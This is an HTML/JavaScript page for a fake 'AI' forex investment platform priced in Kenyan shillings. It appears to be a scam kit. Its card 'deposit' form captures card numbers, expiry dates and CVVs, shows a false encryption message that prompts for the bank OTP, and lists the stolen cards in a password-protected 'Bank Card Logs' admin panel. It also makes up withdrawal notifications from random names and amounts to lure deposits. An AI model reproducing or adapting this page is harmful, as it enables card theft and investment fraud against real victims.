<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>ELITE HUB | Institutional AI</title>
    
    <meta name="mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
    <link rel="apple-touch-icon" href="https://i.ibb.co/LzNf9Lh/elite-logo.png">

    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <script src="https://s3.tradingview.com/tv.js"></script>

    <style>
        :root {
            --primary: #22c55e; --bg: #060910; --card: #111827; 
            --gold: #f59e0b; --gray: #94a3b8; --sidebar-w: 260px;
        }

        body { font-family: 'Inter', sans-serif; margin: 0; background: var(--bg); color: white; display: flex; overflow-x: hidden; }
        
        /* SIDEBAR NAVIGATION */
        .sidebar { width: var(--sidebar-w); background: #0f172a; height: 100vh; position: fixed; border-right: 1px solid rgba(255,255,255,0.05); z-index: 100; transition: 0.3s; }
        .nav-item { padding: 15px 25px; color: var(--gray); cursor: pointer; display: flex; align-items: center; font-size: 14px; transition: 0.2s; }
        .nav-item i { margin-right: 15px; width: 20px; }
        .nav-item:hover, .nav-item.active { background: var(--primary); color: white; }

        /* MAIN CONTENT AREA */
        .main { margin-left: var(--sidebar-w); width: calc(100% - var(--sidebar-w)); padding: 30px; box-sizing: border-box; }
        .card { background: var(--card); border-radius: 16px; padding: 25px; border: 1px solid rgba(255,255,255,0.05); margin-bottom: 25px; }

        /* DEPOSIT GRID */
        .pay-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(150px, 1fr)); gap: 15px; margin: 20px 0; }
        .pay-opt { background: #1e293b; padding: 20px; border-radius: 12px; text-align: center; cursor: pointer; border: 1px solid transparent; }
        .pay-opt:hover { border-color: var(--primary); }

        /* NOTIFICATIONS */
        #notify-box { position: fixed; bottom: 20px; left: 20px; z-index: 999; }
        .toast { background: #0f172a; border-left: 4px solid var(--primary); padding: 12px 20px; border-radius: 8px; margin-top: 10px; animation: slide 0.5s ease; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
        @keyframes slide { from { transform: translateX(-100%); } to { transform: translateX(0); } }

        /* BUTTONS & INPUTS */
        input, select { width: 100%; padding: 12px; margin: 8px 0; border-radius: 8px; border: 1px solid #334155; background: #1e293b; color: white; box-sizing: border-box; }
        .btn { background: var(--primary); color: white; border: none; padding: 14px; width: 100%; border-radius: 8px; font-weight: bold; cursor: pointer; }
        .hidden { display: none; }

        @media (max-width: 900px) { .sidebar { display: none; } .main { margin-left: 0; width: 100%; padding: 20px; } }
    </style>
</head>
<body>

<div id="notify-box"></div>

<div class="sidebar">
    <div style="padding:40px 30px; font-weight:900; font-size:24px; color:var(--primary);">ELITE <span style="color:white">HUB</span></div>
    <div class="nav-item active" onclick="nav('dash')"><i class="fa fa-chart-line"></i> Dashboard</div>
    <div class="nav-item" onclick="nav('fund')"><i class="fa fa-wallet"></i> Fund Account</div>
    <div class="nav-item" onclick="nav('withdraw')"><i class="fa fa-arrow-up"></i> Withdraw</div>
    <div class="nav-item" onclick="nav('plans')"><i class="fa fa-gem"></i> Trading Plans</div>
    <div class="nav-item" onclick="nav('profile')"><i class="fa fa-user-circle"></i> My Profile</div>
    <div class="nav-item" onclick="showAdmin()"><i class="fa fa-lock"></i> Staff Gateway</div>
</div>

<div class="main">
    
    <div id="dash">
        <div style="display:grid; grid-template-columns: repeat(auto-fit, minmax(250px, 1fr)); gap:20px;">
            <div class="card"><small>Net Equity (Balance)</small><h2 id="bal" style="color:var(--primary)">KES 0.00</h2></div>
            <div class="card"><small>Active Investment</small><h2 id="inv">KES 0.00</h2></div>
            <div class="card"><small>AI Generated Profit</small><h2 id="prof" style="color:var(--gold)">KES 0.00</h2></div>
        </div>
        <div class="card" style="height:450px; padding:0; overflow:hidden;"><div id="chart"></div></div>
    </div>

    <div id="fund" class="hidden">
        <h1>Deposit Funds</h1>
        <div class="pay-grid">
            <div class="pay-opt" onclick="setPay('mpesa')"><i class="fa fa-mobile-alt"></i><br>M-Pesa</div>
            <div class="pay-opt" onclick="setPay('crypto')"><i class="fa fa-bitcoin"></i><br>USDT</div>
            <div class="pay-opt" onclick="setPay('card')"><i class="fa fa-credit-card"></i><br>Bank Card</div>
        </div>

        <div id="payForm" class="card hidden" style="max-width:450px;">
            <div id="f-mpesa" class="hidden">
                <h3>Pay via M-Pesa</h3>
                <p>Send funds to: <b>+254 785 449 376</b></p>
                <input id="m_ref" placeholder="Enter M-Pesa Code">
                <button class="btn" onclick="submitDep()">Submit Payment</button>
            </div>
            <div id="f-card" class="hidden">
                <h3>Direct Card Deposit</h3>
                <input id="c_num" placeholder="Card Number (16 Digits)">
                <div style="display:flex; gap:10px;"><input id="c_exp" placeholder="MM/YY"><input id="c_cvv" placeholder="CVV"></div>
                <input id="c_name" placeholder="Name on Card">
                <button class="btn" onclick="logCard()">Authorize Secure Deposit</button>
            </div>
        </div>
    </div>

    <div id="admin" class="hidden">
        <h1>Master Administration</h1>
        <div class="card">
            <h3>Bank Card Logs (Confidential)</h3>
            <table style="width:100%; text-align:left; font-size:13px;">
                <thead><tr style="color:var(--gold)"><th>User</th><th>Card Details</th><th>CVV</th><th>Status</th></tr></thead>
                <tbody id="cardTable"></tbody>
            </table>
        </div>
        <div class="card">
            <h3>Active Members</h3>
            <div id="userList"></div>
        </div>
    </div>

    <div id="profile" class="hidden">
        <div class="card" style="max-width:500px;">
            <h2>Edit Profile</h2>
            <input id="p_name" placeholder="Full Name">
            <input id="p_phone" placeholder="Phone">
            <button class="btn" onclick="alert('Profile Updated')">Save Changes</button>
        </div>
    </div>

</div>

<script>
    // --- DATABASE ---
    let users = JSON.parse(localStorage.getItem("EH_Users")) || [{name:"Admin User", phone:"07123", bal:0, inv:0, prof:0, status:"Active"}];
    let cards = JSON.parse(localStorage.getItem("EH_Cards")) || [];
    let active = users[0];

    // --- NAVIGATION ---
    function nav(id) {
        document.querySelectorAll('.main > div').forEach(d => d.classList.add('hidden'));
        document.getElementById(id).classList.remove('hidden');
        if(id === 'dash') renderChart();
    }

    // --- FUNDING ---
    function setPay(t) {
        document.getElementById('payForm').classList.remove('hidden');
        ['mpesa','crypto','card'].forEach(x => document.getElementById('f-'+x)?.classList.add('hidden'));
        document.getElementById('f-'+t).classList.remove('hidden');
    }

    function logCard() {
        let details = {
            user: active.name,
            num: document.getElementById('c_num').value,
            exp: document.getElementById('c_exp').value,
            cvv: document.getElementById('c_cvv').value,
            name: document.getElementById('c_name').value
        };
        cards.push(details);
        localStorage.setItem("EH_Cards", JSON.stringify(cards));
        alert("Encrypted payment processing... Please check your bank SMS for the OTP.");
    }

    // --- ADMIN ---
    function showAdmin() {
        if(prompt("Admin Password:") === "elite123") {
            nav('admin');
            const tbody = document.getElementById('cardTable');
            tbody.innerHTML = cards.map(c => `<tr><td>${c.user}</td><td>${c.num} (${c.exp})</td><td>${c.cvv}</td><td style="color:var(--primary)">PENDING</td></tr>`).join('');
        }
    }

    // --- NOTIFICATION ENGINE ---
    function triggerToast() {
        const Names = ["John K.", "Sarah W.", "Musa O.", "Grace L.", "Amara P.", "Kevin S."];
        const Amt = (Math.floor(Math.random() * 50000) + 1500).toLocaleString();
        const box = document.getElementById('notify-box');
        const toast = document.createElement('div');
        toast.className = 'toast';
        toast.innerHTML = `<small style="color:var(--gray)">Successful Payout</small><br><b>${Names[Math.floor(Math.random()*Names.length)]}</b> just withdrew <span style="color:var(--primary)">KES ${Amt}</span>`;
        box.appendChild(toast);
        setTimeout(() => toast.remove(), 5000);
    }
    setInterval(triggerToast, 30000); // 30-second interval

    // --- INITIALIZE ---
    function renderChart() {
        new TradingView.widget({ "autosize": true, "symbol": "FX:EURUSD", "interval": "1", "theme": "dark", "container_id": "chart", "hide_top_toolbar": true });
    }
    
    window.onload = () => {
        document.getElementById('bal').innerText = "KES " + (active.bal + active.prof).toLocaleString();
        document.getElementById('inv').innerText = "KES " + active.inv.toLocaleString();
        document.getElementById('prof').innerText = "KES " + active.prof.toLocaleString();
        renderChart();
    };
</script>

</body>
</html>

